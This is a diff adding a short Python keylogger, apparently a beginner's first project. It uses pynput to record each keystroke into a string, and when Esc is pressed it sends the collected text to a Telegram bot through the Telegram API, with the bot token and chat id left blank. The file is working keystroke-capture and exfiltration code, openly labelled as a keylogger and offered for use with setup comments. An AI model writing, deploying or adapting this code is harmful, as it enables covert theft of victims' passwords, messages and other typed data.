@@ -1,0 +1,56 @@
+# *******  ### Keylogger #### ... its a first phython tool create in life *******
+# author = "Dhruv kumar"
+# date : 31 March 2024
+
+
+#required :
+# import pynput    ->   pip install pynput
+# import requests  ->   pip install requests
+
+#import files
+from pynput.keyboard import Listener, Key
+import requests
+
+#for telegram bot
+token = ''  #Enter token
+id = ''  #Enter Chat_id
+text =''
+
+
+#its a function consume the presskey 
+def on_press(key):
+    #use try catch for proctect to expception 
+    try:
+        global text #use globol for access the global variable 
+        
+        #its not store the space b/w data and its also ignore the space key so if key is space the ' ' store the space 
+        if (key == Key.space):
+           
+           key.char = ' '
+        
+        text = text + key.char #store press key in the text variable 
+
+        print('Key {} pressed'.format(key.char))#print which key press by user
+        
+    except AttributeError:#for exception is occured
+        print('Special key {} pressed'.format(key))
+      
+#create another function the contain the key as a parameter and its used also find which press key release by user
+#but its main motive exit from the program 
+def on_release(key):
+
+
+    if key == Key.esc:#if the key ==Key.esc then the condition 
+
+        print('\n\nStore data : ',text)#because the program is exit therefore print all press key data 
+        
+        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={text}')#also send the press key data to telegram bot for access the data is widely
+
+        return False #return false for exit the program
+
+
+#listener is function its dectect the press key and and also call to both of these function for pass the press key as an argument 
+with Listener(on_press=on_press, on_release=on_release) as listener:#as listener is like an object @ if i am wrong then change its  
+    print("Press 'Esc' to exit.")#print this for user help how exit with this program
+    listener.join()#its work as like - its create a internally loop for call function
+
